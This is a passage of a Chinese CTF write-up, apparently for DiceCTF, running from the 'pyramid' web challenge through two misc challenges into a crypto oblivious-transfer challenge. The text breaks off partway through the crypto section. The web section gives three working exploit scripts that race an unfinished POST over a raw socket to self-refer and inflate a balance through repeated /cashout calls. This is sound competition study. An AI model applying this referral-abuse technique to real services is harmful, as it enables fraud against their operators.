class="keyword">while</span> <span class="string">b&#x27;\r\n\r\n&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response:  <span class="comment"># 读取到空行表示响应头结束</span></span><br><span class="line">        response += ssl_sock.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    headers = response.split(<span class="string">b&#x27;\r\n\r\n&#x27;</span>)[<span class="number">0</span>].decode()</span><br><span class="line">    cookie_header = [line <span class="keyword">for</span> line <span class="keyword">in</span> headers.split(</span><br><span class="line">        <span class="string">&#x27;\r\n&#x27;</span>) <span class="keyword">if</span> <span class="string">&#x27;set-cookie:&#x27;</span> <span class="keyword">in</span> line.lower()][<span class="number">0</span>]</span><br><span class="line">    token = cookie_header.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;https://pyramid.dicec.tf/code&quot;</span></span><br><span class="line">    cookie = &#123;</span><br><span class="line">        <span class="string">&quot;token&quot;</span>: token</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.get(url, cookies=cookie, verify=<span class="literal">True</span>)</span><br><span class="line">    code = re.findall(<span class="string">r&#x27;&lt;strong&gt;(.*?)&lt;/strong&gt;&#x27;</span>, res.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;获取到的code: <span class="subst">&#123;code&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送第二个块：包含refer=code的数据</span></span><br><span class="line">    refer_data = <span class="string">f&quot;name=attacker&amp;refer=<span class="subst">&#123;code&#125;</span>&quot;</span>.encode()</span><br><span class="line">    chunk2_length = <span class="built_in">format</span>(<span class="built_in">len</span>(refer_data), <span class="string">&#x27;x&#x27;</span>)  <span class="comment"># 将长度转换为十六进制字符串</span></span><br><span class="line">    chunk2 = <span class="string">f&quot;<span class="subst">&#123;chunk2_length&#125;</span>\r\n<span class="subst">&#123;refer_data.decode()&#125;</span>\r\n&quot;</span></span><br><span class="line">    ssl_sock.send(chunk2.encode())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送结束块</span></span><br><span class="line">    ssl_sock.send(<span class="string">b&quot;0\r\n\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 关闭连接</span></span><br><span class="line">    ssl_sock.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Exploit成功！Token已注入：<span class="subst">&#123;token&#125;</span>&quot;</span>)</span><br><span class="line">    addRef(code)</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cashout</span>(<span class="params">token</span>):</span><br><span class="line">    url = <span class="string">&quot;https://pyramid.dicec.tf/cashout&quot;</span></span><br><span class="line">    cookie = &#123;</span><br><span class="line">        <span class="string">&quot;token&quot;</span>: token</span><br><span class="line">    &#125;</span><br><span class="line">    requests.get(url, cookies=cookie, verify=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    token = exploit()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> trange(<span class="number">63</span>):</span><br><span class="line">        cashout(token)</span><br><span class="line">    res = requests.get(<span class="string">&quot;https://pyramid.dicec.tf/buy&quot;</span>,</span><br><span class="line">                       cookies=&#123;<span class="string">&quot;token&quot;</span>: token&#125;)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>这里是<code>V&amp;N</code>的师傅的<code>exp</code>，我小改动了一下，主要是通过<code>socket</code>创建进程，注意到<strong>分块请求头</strong>和<strong>结束块</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">hostname = <span class="string">&#x27;pyramid.dicec.tf&#x27;</span></span><br><span class="line">url = <span class="string">f&#x27;http://<span class="subst">&#123;hostname&#125;</span>&#x27;</span></span><br><span class="line">context = ssl.create_default_context()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> socket.create_connection((hostname, <span class="number">443</span>)) <span class="keyword">as</span> sock:</span><br><span class="line">    <span class="keyword">with</span> context.wrap_socket(sock, server_hostname=hostname) <span class="keyword">as</span> ssock:</span><br><span class="line">        ssock.send(<span class="string">b&#x27;POST /new HTTP/1.1\r\n&#x27;</span></span><br><span class="line">                   <span class="string">b&#x27;Host: pyramid.dicec.tf\r\n&#x27;</span></span><br><span class="line">                   <span class="string">b&#x27;Connection: keep-alive\r\n&#x27;</span></span><br><span class="line">                   <span class="string">b&#x27;Keep-Alive: timeout=25\r\n&#x27;</span></span><br><span class="line">                   <span class="string">b&#x27;Host: pyramid.dicec.tf\r\n&#x27;</span></span><br><span class="line">                   <span class="string">b&#x27;Content-Length: 51\r\n&#x27;</span></span><br><span class="line">                   <span class="string">b&#x27;\r\n\r\n&#x27;</span>)</span><br><span class="line">        res = ssock.recv(<span class="number">4096</span>).decode()</span><br><span class="line">        token = re.search(<span class="string">r&quot;token=(\w+)&quot;</span>, res)[<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[+] Token: <span class="subst">&#123;token&#125;</span>&#x27;</span>)</span><br><span class="line">        resp = requests.get(url + <span class="string">&#x27;/code&#x27;</span>, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line">        code = re.search(<span class="string">r&quot;strong&gt;(\w+)&lt;/strong&quot;</span>, resp.text)[<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[+] Code: <span class="subst">&#123;code&#125;</span>&#x27;</span>)</span><br><span class="line">        ssock.send(<span class="string">f&#x27;name=pepos&amp;refer=<span class="subst">&#123;code&#125;</span>&#x27;</span>.encode())</span><br><span class="line">        requests.post(url + <span class="string">&#x27;/new&#x27;</span>, data=&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;pepos&#x27;</span>, <span class="string">&#x27;refer&#x27;</span>: code&#125;)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Generated self-referential user&#x27;</span>)</span><br><span class="line">        ssock.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> trange(<span class="number">63</span>):</span><br><span class="line">    requests.get(url + <span class="string">&#x27;/cashout&#x27;</span>, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line">res = requests.get(url + <span class="string">&#x27;/buy&#x27;</span>, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>这里是<code>discord</code>上面一位师傅发的，也是通过<code>socket</code>创建进程，但这里并没有发现需要分块请求头，有点奇怪</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;https://pyramid.dicec.tf&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># POST a request to /new but don&#x27;t send data yet</span></span><br><span class="line"><span class="comment"># We receive the cookie with our user token because of the server implementation</span></span><br><span class="line">r = remote(<span class="string">&#x27;pyramid.dicec.tf&#x27;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;POST /new HTTP/1.1\r\nHost: pyramid.dicec.tf:443\r\nContent-Length: 100\r\n\r\n&#x27;</span>)</span><br><span class="line">token = r.recv().decode().split(<span class="string">&#x27;token=&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;\r\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate a new code for our not totally created account</span></span><br><span class="line">res = requests.get(URL + <span class="string">&#x27;/code&#x27;</span>, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line">code = res.text.split(<span class="string">&#x27;&lt;strong&gt;&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&lt;/strong&gt;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Complete the initial registration with self-referral</span></span><br><span class="line">r.send(<span class="string">b&#x27;refer=&#x27;</span> + code.encode() + <span class="string">b&#x27;&amp;a=1&#x27;</span> * <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create another account so that our ref count is set to 1</span></span><br><span class="line">requests.post(URL + <span class="string">&#x27;/new&#x27;</span>, data=&#123;<span class="string">&#x27;refer&#x27;</span>: code&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit the /cashout exponential growth in case of self-referral</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> trange(<span class="number">63</span>):</span><br><span class="line">    requests.get(URL + <span class="string">&#x27;/cashout&#x27;</span>, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Buy the flag</span></span><br><span class="line">res = requests.get(URL + <span class="string">&#x27;/buy&#x27;</span>, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>这也是<code>discord</code>上面的一位师傅发的，也是长见识了，<strong>pwntools</strong>也能<strong>实现分块传输</strong>，好思路</p><p>我试了一下，<code>Python</code>的<code>requests</code>发包可能是无法实现分块传输的，应该是需要借助进程才能实现</p><p>这样看，这道题还是挺有意思的</p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id="dicecap"><a class="markdownIt-Anchor" href="#dicecap"></a> dicecap</h2><blockquote><p>As DiceGang haven’t won a CTF in 4 months, we’ve taken to more drastic measures to get to the top of the leaderboard - hacking our competitors! This pcap was gathered from a previous “information gathering” mission, can you find the flag?</p></blockquote><p>先导一下，得到一个压缩包<code>coolzip.zip</code>和二进制文件<code>main</code><br /><img src="https://picx.zhimg.com/80/v2-7e1d5e967d495c54348dc24b5d8a0c8e_1440w.png" alt="" /><br /><code>ida</code>反编译</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">generate_password</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *src; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">6</span>]; <span class="comment">// [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">10</span>]; <span class="comment">// [rsp+26h] [rbp-3Ah] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">40</span>]; <span class="comment">// [rsp+30h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = time(<span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%d&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(v1 - v1 % <span class="number">60</span>));</span><br><span class="line">  src = setlocale(<span class="number">6</span>, &amp;locale);</span><br><span class="line">  <span class="built_in">strncpy</span>(dest, src, <span class="number">5uLL</span>);</span><br><span class="line">  dest[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">  v3 = getlogin();</span><br><span class="line">  <span class="built_in">strcat</span>(v6, s);</span><br><span class="line">  <span class="built_in">strcat</span>(v6, dest);</span><br><span class="line">  <span class="built_in">strcat</span>(v6, v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The password is:%s\n&quot;</span>, v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>交给<code>ChatGPT</code><br /><img src="https://picx.zhimg.com/80/v2-04d7b1da0e83ea1bef2f76e28652534d_1440w.png" alt="" /></p><p>后面两个简单，就找第一个的时间即可，<code>1743126493</code>，发现不对，再转化一下是，<code>1743126480</code><br /><strong>password: 1743126480en_UShacker</strong><br /><code>dice&#123;5k1d_y0ur_w@y_t0_v1ct0ry_t0d4y!!!&#125;</code></p><h2 id="bcu-binding"><a class="markdownIt-Anchor" href="#bcu-binding"></a> bcu-binding</h2><blockquote><p>Comrades, we found this old manual in our basement. Can you see if there’s anything interesting about it?</p></blockquote><p>给了一个PDF<br /><img src="https://pic1.zhimg.com/80/v2-0257e7475902470d41749e3ca81afe76_1440w.png" alt="" /><br />记得<code>OSCTF</code>也有这样一题，也是涂黑了，但最后看文档属性就出了，这题并没有</p><p>尝试全选改变字体颜色看看有没有隐藏字符，发现异常<br /><img src="https://pica.zhimg.com/80/v2-92abc36df6c3af108e5717f5862826ce_1440w.png" alt="" /><br /><code>FLAG: dice&#123;r3ad1ng_th4_d0cs_71ccd&#125;</code></p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="vorpal-sword"><a class="markdownIt-Anchor" href="#vorpal-sword"></a> vorpal-sword</h2><blockquote><p>Choose your own adventure!</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">DEATH_CAUSES = [</span><br><span class="line"><span class="string">&#x27;a fever&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;dysentery&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;measles&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;cholera&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;typhoid&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;exhaustion&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a snakebite&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a broken leg&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a broken arm&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;drowning&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_ot</span>(<span class="params">key, msg0, msg1</span>):</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">https://en.wikipedia.org/wiki/Oblivious_transfer#1–2_oblivious_transfer</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">x0 = secrets.randbelow(key.n)</span><br><span class="line">x1 = secrets.randbelow(key.n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n: <span class="subst">&#123;key.n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e: <span class="subst">&#123;key.e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;x0: <span class="subst">&#123;x0&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;x1: <span class="subst">&#123;x1&#125;</span>&#x27;</span>)</span><br><span class="line">v = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;v: &#x27;</span>))</span><br><span class="line"><span class="keyword">assert</span> <span class="number">0</span> &lt;= v &lt; key.n, <span class="string">&#x27;invalid value&#x27;</span></span><br><span class="line">k0 = <span class="built_in">pow</span>(v - x0, key.d, key.n)</span><br><span class="line">k1 = <span class="built_in">pow</span>(v - x1, key.d, key.n)</span><br><span class="line">m0 = <span class="built_in">int</span>.from_bytes(msg0.encode(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">m1 = <span class="built_in">int</span>.from_bytes(msg1.encode(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">c0 = (m0 + k0) % key.n</span><br><span class="line">c1 = (m1 + k1) % key.n</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c0: <span class="subst">&#123;c0&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c1: <span class="subst">&#123;c1&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">flag = f.read().strip()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;=== CHOOSE YOUR OWN ADVENTURE: Vorpal Sword Edition ===&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;you enter a cave.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the tunnel forks ahead. do you take the left or right path?&#x27;</span>)</span><br><span class="line">key = RSA.generate(<span class="number">1024</span>)</span><br><span class="line">msgs = [<span class="literal">None</span>, <span class="literal">None</span>]</span><br><span class="line">page = secrets.randbits(<span class="number">32</span>)</span><br><span class="line">live = <span class="string">f&#x27;you continue walking. turn to page <span class="subst">&#123;page&#125;</span>.&#x27;</span></span><br><span class="line">die = <span class="string">f&#x27;you die of <span class="subst">&#123;secrets.choice(DEATH_CAUSES)&#125;</span>.&#x27;</span></span><br><span class="line">msgs = (live, die) <span class="keyword">if</span> secrets.randbits(<span class="number">1</span>) <span class="keyword">else</span> (die, live)</span><br><span class="line">run_ot(key, *msgs)</span><br><span class="line">page_guess = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;turn to page: &#x27;</span>))</span><br><span class="line"><span class="keyword">if</span> page_guess != page:</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;you find a chest containing <span class="subst">&#123;flag&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>奥，原来这就是<a href="https://lazzzaro.github.io/2021/06/20/crypto-%E4%B8%8D%E7%BB%8F%E6%84%8F%E4%BC%A0%E8%BE%93/index.html">不经意传输</a></p><p>这里需要进行<strong>64次的输入</strong><br /><code>n e x0 x1 c0 c1</code>是给出的，<code>v</code>是我们输入的<br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mn>0</mn><mo>≡</mo><mo stretchy="false">(</mo><mi>v</mi><mo>−</mo><mi>x</mi><mn>0</mn><msup><mo stretchy="false">)</mo><mi>d</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">k0\equiv (v-x0)^{d}mod(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mord">0</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mn>1</mn><mo>≡</mo><mo stretchy="false">(</mo><mi>v</mi><mo>−</mo><mi>x</mi><mn>1</mn><msup><mo stretchy="false">)</mo><mi>d</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">k1\equiv(v-x1)^{d}mod(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>0</mn><mo>≡</mo><mi>m</mi><mn>0</mn><mo>+</mo><mi>k</mi><mn>0</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c0\equiv m0+k0\ mod(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">0</span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>1</mn><mo>≡</mo><mi>m</mi><mn>1</mn><mo>+</mo><mi>k</mi><mn>1</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c1\equiv m1+k1\ mod(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">1</span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mn>0</mn><mo separator="true">,</mo><mi>m</mi><mn>1</mn><mo>=</mo><mo stretchy="false">(</mo><mi>l</mi><mi>i</mi><mi>v</mi><mi>e</mi><mo separator="true">,</mo><mi>d</mi><mi>i</mi><mi>e</mi><mo stretchy="false">)</mo><mi>o</mi><mi>r</mi><mo stretchy="false">(</mo><mi>d</mi><mi>i</mi><mi>e</mi><mo separator="true">,</mo><mi>l</mi><mi>i</mi><mi>v</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">m0,m1=(live,die)or(die,live)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">m</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">m</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal">e</span><span class="mclose">)</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">e</span><span class="mclose">)</span></span></span></span></p><p>emm，还要注意的是句子后面都有<strong>句号</strong>，<code>VScode</code>的<code>copilot</code>给我<code>tap</code>的都没有，检查了半天<br /><code>live = f'you continue walking. turn to page &#123;page&#125;.'</code><br /><code>die = f'you die of &#123;secrets.choice(DEATH_CAUSES)&#125;.'</code></p><p>这里我们先假设<code>m0 = die</code>，因此<code>m1</code>是我们要知道的，同时<code>m0</code>是可以<strong>爆破</strong><code>DEATH_CAUSES</code>的</p><p>可以看到<code>k0,k1</code>的形式相似，此处精心构造<code>v=(x0+x1)/2</code><br />得到<br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mn>1</mn><mo>≡</mo><mo stretchy="false">(</mo><mo>−</mo><mn>1</mn><msup><mo stretchy="false">)</mo><mi>d</mi></msup><mo>∗</mo><mi>k</mi><mn>0</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">k1\equiv (-1)^{d}*k0(mod\ n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">−</span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mspace" 